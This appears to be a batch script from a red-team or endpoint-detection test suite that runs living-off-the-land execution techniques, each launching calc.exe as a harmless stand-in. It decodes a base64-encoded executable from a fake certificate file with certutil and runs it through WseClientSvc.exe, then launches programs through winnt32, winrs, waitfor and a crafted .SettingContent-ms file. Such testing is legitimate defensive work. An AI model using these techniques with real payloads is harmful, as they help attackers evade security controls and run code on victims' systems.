REM start line 648
REM end line 1009

echo %time% %date% [+] Testing WseClientSvc.exe exec
REM Source taken from https://blog.huntresslabs.com/abusing-trusted-applications-a719219220f?gi=de073115ebbc
echo -----BEGIN CERTIFICATE----- > pass.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> pass.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDADpYUFsAAAAA >> pass.b64
echo AAAAAOAAAgELAQsAAAQAAAAIAAAAAAAATiMAAAAgAAAAQAAAAABAAAAgAAAAAgAA >> pass.b64
echo BAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAA >> pass.b64
echo AAAAABAAAAAAAAAAAAAAAAAjAABLAAAAAEAAANAEAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA >> pass.b64
echo VAMAAAAgAAAABAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAANAEAAAAQAAA >> pass.b64
echo AAYAAAAGAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADAAA >> pass.b64
echo AAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAwIwAAAAAAAEgAAAACAAUA >> pass.b64
echo ZCAAAJwCAAABAAAAAQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAC4AAhaaKAMAAAomKh4CKAQAAAoqQlNKQgEAAQAAAAAA >> pass.b64
echo DAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAAAEAACN+AABsAQAA0AAAACNTdHJpbmdz >> pass.b64
echo AAAAADwCAAAIAAAAI1VTAEQCAAAQAAAAI0dVSUQAAABUAgAASAAAACNCbG9iAAAA >> pass.b64
echo AAAAAAIAAAFHFQAACQAAAAD6JTMAFgAAAQAAAAQAAAACAAAAAgAAAAEAAAAEAAAA >> pass.b64
echo AgAAAAEAAAACAAAAAAAKAAEAAAAAAAYANAAtAAYAawBLAAYAiwBLAAoAwQCuAAAA >> pass.b64
echo AAABAAAAAAABAAEAAAAQABMAGwAFAAEAAQBQIAAAAACRADsACgABAFwgAAAAAIYY >> pass.b64
echo QAAQAAIAAAABAEYAEQBAABQAGQBAABAAIQDJABkACQBAABAALgALAB8ALgATACgA >> pass.b64
echo BIAAAAAAAAAAAAAAAAAAAAAAqQAAAAQAAAAAAAAAAAAAAAEAJAAAAAAABAAAAAAA >> pass.b64
echo AAAAAAAAAQAtAAAAAAAAAAA8TW9kdWxlPgBwYXNzLmV4ZQBQcm9ncmFtAHBhc3N0 >> pass.b64
echo aHJ1AG1zY29ybGliAFN5c3RlbQBPYmplY3QATWFpbgAuY3RvcgBhcmdzAFN5c3Rl >> pass.b64
echo bS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9u >> pass.b64
echo c0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwYXNzAFN5 >> pass.b64
echo c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFN0YXJ0AAAAAyAAAAAAADKi38C8gvFL >> pass.b64
echo n9EJCAHas0cACLd6XFYZNOCJBQABAR0OAyAAAQQgAQEIBQABEhEOCAEACAAAAAAA >> pass.b64
echo HgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAoIwAAAAAAAAAAAAA+IwAA >> pass.b64
echo ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCMAAAAAAAAAAF9Db3JFeGVNYWluAG1z >> pass.b64
echo Y29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAACABAAAAAgAACAGAAAADgAAIAAAAAAAAAAAAAAAAAAAAEA >> pass.b64
echo AQAAAFAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEA >> pass.b64
echo AAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAJAAAACgQAAAPAIAAAAAAAAAAAAA >> pass.b64
echo 4EIAAOoBAAAAAAAAAAAAADwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4A >> pass.b64
echo RgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAABAAAA >> pass.b64
echo AAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQA >> pass.b64
echo AABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAScAQAAAQBTAHQAcgBpAG4A >> pass.b64
echo ZwBGAGkAbABlAEkAbgBmAG8AAAB4AQAAAQAwADAAMAAwADAANABiADAAAAAsAAIA >> pass.b64
echo AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYA >> pass.b64
echo aQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADQACQABAEkA >> pass.b64
echo bgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcABhAHMAcwAuAGUAeABlAAAAAAAoAAIA >> pass.b64
echo AQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAAAgAAAAPAAJAAEATwByAGkA >> pass.b64
echo ZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAHAAYQBzAHMALgBlAHgAZQAAAAAA >> pass.b64
echo NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4A >> pass.b64
echo MAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4A >> pass.b64
echo MAAuADAALgAwAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9 >> pass.b64
echo IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJu >> pass.b64
echo OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0i >> pass.b64
echo MS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFt >> pass.b64
echo ZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJu >> pass.b64
echo OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4N >> pass.b64
echo CiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1t >> pass.b64
echo aWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRp >> pass.b64
echo b25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAg >> pass.b64
echo ICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8 >> pass.b64
echo L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo ACAAAAwAAABQMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pass.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= >> pass.b64
echo -----END CERTIFICATE----- >> pass.b64
start "" cmd /c certutil -f -decode pass.b64 pass_TestBin.exe >nul
start "" cmd /c WseClientSvc.exe pass_TestBin.exe calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: certutil -f -decode pass.b64 pass_TestBin.exe 
echo Command Excuted: WseClientSvc.exe pass_TestBin.exe calc.exe 

timeout 5


REM ---- EOF LOLBAS Payloads ----

echo **********************************************
echo *        Testing Custom PAYLOADS             *
echo **********************************************


echo %time% %date% [+] Testing winnt32 exec
start "" cmd /c winnt32 /cmd:calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: winnt32 /cmd:calc.exe

timeout 5

echo %time% %date% [+] Testing winrs exec
start "" cmd /c winrs -r:http://127.0.0.1 calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: winrs -r:http://127.0.0.1 calc.exe

timeout 5

REM Example: https://twitter.com/subtee/status/872244674609676288
echo %time% %date% [+] Testing waitfor exec
start "" cmd /c waitfor SDX & calc.exe
timeout 3
start "" cmd /c waitfor /s 127.0.0.1 /si SDX
echo Execution Finished at %time% %date%
echo Command Excuted: waitfor SDX & calc.exe
echo Command Excuted: waitfor /s 127.0.0.1 /si SDX

echo %time% %date% [+] Testing .SettingContent-ms extension exec
echo ^<?xml version="1.0" encoding="UTF-8"?^> > Test.SettingContent-ms
echo  ^<PCSettings^> >> Test.SettingContent-ms
echo    ^<SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"^> >> Test.SettingContent-ms
echo      ^<ApplicationInformation^> >> Test.SettingContent-ms
echo        ^<AppID^> windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel^</AppID^> >> Test.SettingContent-ms
echo        ^<DeepLink^> %windir%\system32\calc.exe^</DeepLink^> >> Test.SettingContent-ms
echo        ^<Icon^> %windir%\system32\control.exe^</Icon^> >> Test.SettingContent-ms
echo      ^</ApplicationInformation^> >> Test.SettingContent-ms
echo      ^<SettingIdentity^> >> Test.SettingContent-ms
echo      ^<PageID^> ^</PageID^> >> Test.SettingContent-ms
echo        ^<HostID^> {12B1697E-D3A0-4DBC-B568-CCF64A3F934D}^</HostID^> >> Test.SettingContent-ms
echo      ^</SettingIdentity^> >> Test.SettingContent-ms
echo      ^<SettingInformation^> >> Test.SettingContent-ms
echo        ^<Description^> @shell32.dll,-4161^</Description^> >> Test.SettingContent-ms
echo        ^<Keywords^> @shell32.dll,-4161^</Keywords^> >> Test.SettingContent-ms
echo      ^</SettingInformation^> >> Test.SettingContent-ms
echo    ^</SearchableContent^> >> Test.SettingContent-ms
echo  ^</PCSettings^> >> Test.SettingContent-ms
start "" cmd /c Test.SettingContent-ms
echo Execution Finished at %time% %date%
echo Command Excuted: Test.SettingContent-ms

timeout 5


REM ---- EOF Custom Payloads ----


